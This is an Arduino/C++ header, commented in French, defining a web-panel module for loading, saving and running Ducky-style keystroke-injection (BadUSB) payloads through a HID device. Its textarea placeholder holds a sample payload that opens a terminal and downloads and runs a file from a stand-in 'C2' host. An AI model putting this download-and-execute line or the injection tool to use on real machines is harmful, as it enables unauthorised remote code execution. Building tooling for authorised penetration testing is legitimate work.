// language: C++ (Arduino), file: webui/payload_manager_module.h
// MODULE WEB BONUS pour le panel Joker : "Payload Manager"
// Snippet autonome - integre le dans web_ui.h apres inspection du repo officiel.
// Aucune dependance externe : HTML/CSS/JS inline, style du panel vert Joker.

static const char PAYLOAD_MANAGER_HTML[] PROGMEM = R"HTML(
<div class="module" id="payloadManager">
  <h2>▣ Payload Manager <span style="opacity:.5">/ Ducky-lite</span></h2>
  <div style="display:flex;gap:12px;flex-wrap:wrap">
    <div style="flex:1;min-width:260px">
      <label style="font-size:.8em;opacity:.7">Payload (payload.txt)</label>
      <textarea id="pmCode" rows="10" style="width:100%;background:#071a07;color:#4f4;
        font-family:monospace;border:1px solid #0f0f0f;border-radius:8px;padding:8px"
        placeholder="DELAY 2000&#10;GUI SPACE&#10;STRING Terminal&#10;ENTER&#10;STRING curl -sL http://C2/payload -o /tmp/.p && /tmp/.p&#10;ENTER"></textarea>
      <div style="display:flex;gap:8px;margin-top:8px">
        <button onclick="pmSave()" class="btn">💾 Save to card</button>
        <button onclick="pmRun()" class="btn">▶ Run now (HID)</button>
        <button onclick="pmFetch()" class="btn">↻ Load current</button>
      </div>
      <div id="pmStatus" style="margin-top:8px;font-size:.85em;color:#8f8"></div>
    </div>
    <div style="width:220px;font-size:.85em;color:#9f9;opacity:.85">
      <b>Commandes Ducky-lite supportées ici :</b><br>
      DELAY ms · STRING txt · ENTER · TAB · ESC · SPACE ·
      GUI k · CTRL k · ALT k · CTRL-SHIFT k · REM<br><br>
      <b>Rule:</b> authorized test machines only.
      The keyboard is a real keyboard.
    </div>
  </div>
</div>
<script>
async function pmSave(){
  const code = document.getElementById('pmCode').value;
  const fd = new FormData();
  fd.append('path', '/payload.txt');
  fd.append('data', new Blob([code]));
  const r = await fetch('/save', {method:'POST', body: fd});
  document.getElementById('pmStatus').textContent =
    r.ok ? '✓ payload.txt sauvé sur la carte (LittleFS)' : '✗ erreur sauvegarde ('+r.status+')';
}
async function pmRun(){
  const r = await fetch('/hid/run?file=/payload.txt', {method:'POST'});
  document.getElementById('pmStatus').textContent =
    r.ok ? '✓ injection HID lancée' : '✗ erreur run ('+r.status+')';
}
async function pmFetch(){
  const r = await fetch('/file?path=/payload.txt');
  document.getElementById('pmCode').value = r.ok ? await r.text() : '(vide)';
}
</script>
)HTML";

// Integration (a valider sur le firmware reel) :
//   1. inclure ce header dans SGP_Card_Joker.ino
//   2. servir la page : server.send_P(200, "text/html", PAYLOAD_MANAGER_HTML)
//   3. routes /save (LittleFS write), /hid/run (executor), /file (read) a brancher
//      sur l'API existante de web_ui.h - ne pas inventer des routes qui n'existent pas
